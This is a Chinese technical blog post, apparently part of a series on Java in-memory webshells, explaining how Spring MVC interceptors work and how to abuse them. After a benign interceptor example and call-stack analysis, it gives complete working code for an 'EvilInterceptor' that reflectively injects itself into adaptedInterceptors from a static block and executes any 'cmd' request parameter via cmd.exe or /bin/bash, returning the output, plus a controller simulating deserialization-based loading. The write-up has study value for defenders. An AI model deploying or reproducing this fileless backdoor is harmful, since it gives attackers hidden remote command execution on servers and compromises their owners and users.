## 写在前面

颓废了几天，罪恶感满满，今天不学习，明天变垃圾！今天继续学习Spring框架中的内存马，这里主要是使用的是`Interceptor`技术来构造内存马的。

这也是内存马系列文章的第十篇了。

## 前置

### 什么是Interceptor技术？

在系统中，经常需要在处理用户请求之前和之后执行一些行为，例如检测用户的权限，或者将请求的信息记录到日志中，即平时所说的“权限检测”及“日志记录”。当然不仅仅这些，所以需要一种机制，拦截用户的请求，在请求的前后添加处理逻辑。

Spring MVC 提供了 Interceptor 拦截器机制，用于请求的预处理和后处理。

在实际应用中常见的作用为：

  * 日志记录：记录请求信息的日志，以便进行信息监控、信息统计、计算 PV（Page View）等；

  * 权限检查：如登录检测，进入处理器检测是否登录；

  * 性能监控：通过拦截器在进入处理器之前记录开始时间，在处理完后记录结束时间，从而得到该请求的处理时间。（反向代理，如 Apache 也可以自动记录）

  * 通用行为：读取 Cookie 得到用户信息并将用户对象放入请求，从而方便后续流程使用，还有如提取 Locale、Theme 信息等，只要是多个处理器都需要的即可使用拦截器实现。

### 简单示例

在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式：

  1. 通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义；

  2. 通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义。

我们这里采用实现`HandlerInterceptor`接口的方式创建一个拦截器类

    
    
    package pres.test.spring.interceptor;
    
    import org.springframework.web.servlet.HandlerInterceptor;
    import org.springframework.web.servlet.ModelAndView;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    public class TestInterceptor implements HandlerInterceptor {
    
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            System.out.println("preHandle.......");
            return false;
        }
    
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            System.out.println("postHandle.......");
        }
    
        @Override
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            System.out.println("afterCompletion.......");
        }
    }
    

重写了三个方法，他们分别的作用如下：

  * preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。

  * postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。

  * afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。

同样我们需要在Spring mvc配置拦截器

    
    
    <!-- 配置拦截器 -->
    <mvc:interceptors>
        <mvc:interceptor>
            <!-- 拦截的资源范围 -->
            <mvc:mapping path="/**"/>
            <!-- 进行处理的拦截器 -->
            <bean class="pres.test.spring.interceptor.TestInterceptor" />
        </mvc:interceptor>
    </mvc:interceptors>
    

![image-20220930225054186.png](https://image.3001.net/images/20221012/1665559478_63466bb65a99ee1e2c980.png!small)

可以在终端中发现`preHandle`方法的调用，为什么只调用了`preHandle`方法呢？从上面方法的功能中我们不难发现这个方法是在达到控制器类之前首先进行调用的，而在我们的拦截器代码中，我们可以发现我们返回的是false，所以将不会向下继续执行，这里完全可以做一个鉴权处理的操作。

### 流程分析

首先看一下一直到`preHandle`方法调用的调用栈

    
    
    preHandle:13, TestInterceptor (pres.test.spring.interceptor)
    applyPreHandle:148, HandlerExecutionChain (org.springframework.web.servlet)
    doDispatch:1062, DispatcherServlet (org.springframework.web.servlet)
    doService:963, DispatcherServlet (org.springframework.web.servlet)
    processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
    doGet:898, FrameworkServlet (org.springframework.web.servlet)
    service:655, HttpServlet (javax.servlet.http)
    service:883, FrameworkServlet (org.springframework.web.servlet)
    service:764, HttpServlet (javax.servlet.http)
    internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
    internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:196, StandardWrapperValve (org.apache.catalina.core)
    invoke:97, StandardContextValve (org.apache.catalina.core)
    invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:135, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
    invoke:78, StandardEngineValve (org.apache.catalina.core)
    service:364, CoyoteAdapter (org.apache.catalina.connector)
    service:624, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
    run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

前面都是Tomcat容器相关的，不用理会，我们直接将关注点放在Spring框架上面来。

关注到`org.springframework.web.servlet.DispatcherServlet#doService`方法中来。

![image-20220930230210652.png](https://image.3001.net/images/20221012/1665559486_63466bbebe57eec7de12a.png!small)

从注释中我们可以知道主要是通过`doDispatch`方法进行资源的调度。

![image-20220930230300237.png](https://image.3001.net/images/20221012/1665559491_63466bc3da95d632681fb.png!small)

跟进

![image-20220930230448159.png](https://image.3001.net/images/20221012/1665559497_63466bc9f1fa43b5a644c.png!small)

主要是通过对对应的handler进行处理，这些handler是寻在于`HandlerMappings`属性中。

![image-20220930230734190.png](https://image.3001.net/images/20221012/1665559505_63466bd111e45397315bb.png!small)

通过调用`getHandler`来确定当前请求的对应的handler到底是哪一个。

![image-20220930230815335.png](https://image.3001.net/images/20221012/1665559515_63466bdb0d703fffa2965.png!small)

在这个方法中，主要是通过遍历前面提到的`handlerMappings`属性来获取对应的handler,
且，该方法返回的是`HandlerExecutionChain`类对象。

我们继续跟进`mapping.getHandler`方法调用的流程。

![image-20220930232658914.png](https://image.3001.net/images/20221012/1665559521_63466be17edb20eef5132.png!small)

首先通过调用`getHandlerInternal`方法获取了对应request请求的handler类，这里为上篇文章中创建的IndexController这个类。

![image-20220930232825533.png](https://image.3001.net/images/20221012/1665559528_63466be85802324c3fa0a.png!small)

之后调用了`getHandlerExecutionChain`方法获取了将要返回的`HandlerExecutionChain`类对象

跟进。

![image-20220930233142341.png](https://image.3001.net/images/20221012/1665559554_63466c024d4e3e7a7b49f.png!small)

首先会判断之前获取的`handler`是否是`HandlerExecutionChain`实例，如果不是将会通过其构造方法封装一个`HandlerExecutionChain`对象进行返回。

之后将会遍历`adaptedInterceptors`属性值，这个属性就是Spring MVC配置的拦截器。

![image-20220930233335770.png](https://image.3001.net/images/20221012/1665559590_63466c26dd329e00333b4.png!small)

之后会判断这个拦截器是否是`MappedInterceptor`实例，如果食，将会调用其`matches`方法匹配拦截器设置的拦截资源路径是否包括该次的请求。

![image-20220930233532588.png](https://image.3001.net/images/20221012/1665559598_63466c2e38a8798725bcd.png!small)

如果是匹配的，则会调用`HandlerExecutionChain#addInterceptor`方法将这个匹配成功的拦截器添加进入`HandlerExecutionChain`类的`interceptorList`属性中。

![image-20220930233716029.png](https://image.3001.net/images/20221012/1665559629_63466c4db7b3e7a660ea8.png!small)

当然，如果你设置的是全局拦截器，自然其就不是`MappedInterceptor`实例，但是他会直接将拦截器添加入属性中去。

最后，将会返回该`HandlerExecutionChain`类对象，

回到`doDispatch`方法中来，

![image-20220930234409777.png](https://image.3001.net/images/20221012/1665559636_63466c5493f4b7b4d4893.png!small)

将会调用`HandlerExecutionChain#applyPreHandle`方法进行处理。

![image-20220930234554467.png](https://image.3001.net/images/20221012/1665559642_63466c5ad8169bd89560d.png!small)

看注释我们也知道这是调用对应拦截器的`preHandle`方法。

主要是遍历之前添加进入拦截器的`interceptorList`属性，之后调用他的`preHandle`方法，从这里遍历也可以体现出同一个资源路径可能有着多个拦截器进行处理！

## 正文

### 注入流程

通过上面对Spring MVC中的流程分析，我们大概清楚了注入的方法，

从上面的分析，我们可以注意到，在方法对应的资源的时候，将会通过遍历`interceptorList`的方式来执行其元素的`preHandler`方法，那么，`interceptorList`中的内容是如何来的呢？

通过上面的分析不难发现，在每一次访问资源路径的同时，将会调用，`AbstractHandlerMapping#getHandlerExecutionChain`方法获取对应的`HandlerExecutionChain`

![image-20221001082703043.png](https://image.3001.net/images/20221012/1665559651_63466c6342c56bfd7cccf.png!small)

在这里，就遍历了`adaptedInterceptors`属性中的值，之后将其中每个元素，通过调用`chain.addInterceptor`方法，也就是前面提到的通过调用`interceptorList#add`写入拦截器，最后将会匹配`interceptorList`中的元素进行调用处理。

所以，我们如果能够动态的向`adaptedInterceptors`属性中添加进入我们恶意的拦截器类，就能够达到我们的目的，我们跟进一下这个属性。

![image-20221001083148259.png](https://image.3001.net/images/20221012/1665559658_63466c6a6db0ca13211dc.png!small)

这是`AbstractHandlerMapping`类中的一个私有属性，

那么如果获取到这个属性值呢？

Spring框架提供了一个用来暴露Request对象的工具，也就是`RequestContextHolder`类，使用该类，可以在一个线程中获取到Request，避免了Request从头到尾的情况。

看看这个类

![image-20221001084205740.png](https://image.3001.net/images/20221012/1665559665_63466c713a9876f720eff.png!small)

能够暴露对应线程的`RequestAttributes`对象，其中存在一个`currentRequestAttributes`方法。

![image-20221001084401050.png](https://image.3001.net/images/20221012/1665559672_63466c780b6d4d621bc63.png!small)

返回当前线程的所有属性，

我们需要得到一个`ApplicationContext`对象，

![image-20221001085023596.png](https://image.3001.net/images/20221012/1665559677_63466c7d83aba1b9c2718.png!small)

存在一个这样的属性，能够获取一个`Application`对象，

之后我们就可以通过上下文对象的`getBean`方法获取`RequestMappingHandlerMapping`类对象。

    
    
    ((ApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0)).getBean(RequestMappingHandlerMapping.class)
    

![image-20221001085824216.png](https://image.3001.net/images/20221012/1665559685_63466c85d1757f43cffca.png!small)

为什么要获取这个对象？

我们的目的是获取`AbstractHandlerMapping`中的`interceptors`属性，之后通过反射赋值

但是因为这个类是一个抽象类，不能够直接获取，所以根据继承关系，我们选择了该类。

![image-20221001090348361.png](https://image.3001.net/images/20221012/1665559692_63466c8c1222c8369989c.png!small)

之后就可以通过反射获取对应属性值，

之后就是创建一个恶意的`Interceptor`对象，调用add方法将其写入。

### 实现

这个内存马的实现很简单(相比于其他的内存马来说)，

根据前面注入流程的分析，

首先是利用`RequestContextHolder`类来获取对应的属性值。

    
    
    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
    Field field = null;
    try {
        field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    field.setAccessible(true);
    java.util.ArrayList<Object> adaptedInterceptors = null;
    try {
        adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }
    

在获取了属性值之后创建一个恶意的interceptor类，

    
    
    public class EvilInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    java.io.PrintWriter printWriter = response.getWriter();
                    ProcessBuilder builder;
                    String o = "";
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                    } else {
                        builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                    }
                    java.util.Scanner c = new java.util.Scanner(builder.start().getInputStream()).useDelimiter("\\A");
                    o = c.hasNext() ? c.next(): o;
                    c.close();
                    printWriter.println(o);
                    printWriter.flush();
                    printWriter.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return false;
            }
            return true;
        }
    
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
        }
    
        @Override
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
        }
    }
    

上面在`preHandler`中进行了命令执行，并将执行完成后的结果返回给界面，

之后调用属性的add方法进行添加，

    
    
    EvilInterceptor evilInterceptor = new EvilInterceptor("aaa");
    adaptedInterceptors.add(evilInterceptor);
    

同样，想要成功注入内存马，需要加载这个类，这里创建了一个Controller模拟通过反序列化注入。

    
    
    package pres.test.spring.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    @Controller
    @RequestMapping("/addSpringInterceptor")
    public class AddSpringInterceptor {
        @GetMapping
        public void index(HttpServletRequest request, HttpServletResponse response) {
            try {
                Class.forName("pres.test.spring.interceptor.EvilInterceptor");
                response.getWriter().println("add successfully!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

### 实例

完整的恶意类

    
    
    package pres.test.spring.interceptor;
    
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.servlet.HandlerInterceptor;
    import org.springframework.web.servlet.ModelAndView;
    import org.springframework.web.servlet.handler.AbstractHandlerMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    import java.lang.reflect.Field;
    
    public class EvilInterceptor implements HandlerInterceptor {
        static {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
            Field field = null;
            try {
                field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            }
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = null;
            try {
                adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            EvilInterceptor evilInterceptor = new EvilInterceptor("aaa");
            adaptedInterceptors.add(evilInterceptor);
        }
    
        public EvilInterceptor(String aaa) {
    
        }
    
    
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    java.io.PrintWriter printWriter = response.getWriter();
                    ProcessBuilder builder;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                    } else {
                        builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                    }
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
                    String s = bufferedReader.readLine();
                    printWriter.println(s);
                    printWriter.flush();
                    printWriter.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return false;
            }
            return true;
        }
    
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
        }
    
        @Override
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
        }
    }
    

这里主要是将具体执行的操作放在了static静态块中，使得，在加载这个类的时候将会执行静态代码块中的类内容，成功写入内存马。

访问控制器

![image-20221001093916725.png](https://image.3001.net/images/20221012/1665559706_63466c9a628001b7b1128.png!small)

之后测试，是否成功注入内存马

![image-20221001093957268.png](https://image.3001.net/images/20221012/1665559711_63466c9fd650a1f9d772a.png!small)

成功执行。

## 总结

贴个注入内存马的具体流程：

  * 首先获取应用的上下文环境，也就是`ApplicationContext`

  * 然后从`ApplicationContext`中获取`AbstractHandlerMapping`实例（用于反射）

  * 反射获取`AbstractHandlerMapping`类的`adaptedInterceptors`字段

  * 通过`adaptedInterceptors`注册拦截器

